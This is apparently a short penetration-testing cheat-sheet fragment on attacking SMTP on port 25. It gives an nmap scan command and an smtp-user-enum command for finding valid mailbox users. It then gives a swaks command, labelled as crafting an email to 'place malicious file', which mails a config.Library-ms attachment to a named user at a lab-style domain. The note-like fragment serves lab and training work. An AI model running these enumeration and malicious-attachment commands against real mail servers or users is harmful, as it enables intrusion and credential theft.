```text
# Version detection + NSE scripts
nmap -Pn -sV -p 25 "--script=banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN tcp_25_smtp_nmap.txt $ip
```

[smtp-user-enum](https://pypi.org/project/smtp-user-enum)

```c
/home/kali/.local/bin/smtp-user-enum -V -m RCPT -w -f '<user@example.com>' -d 'domain.local' -U "/usr/share/metasploit-framework/data/wordlists/unix_users.txt" $ip 25 2>&1 | tee "tcp_25_smtp_user-enum.txt"
```

Craft email to place malicious file over smtp
```c
sudo swaks --auth-user test@supermagicorg.com --auth-password test --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --server supermagicorg.com --attach config.Library-ms --port 25
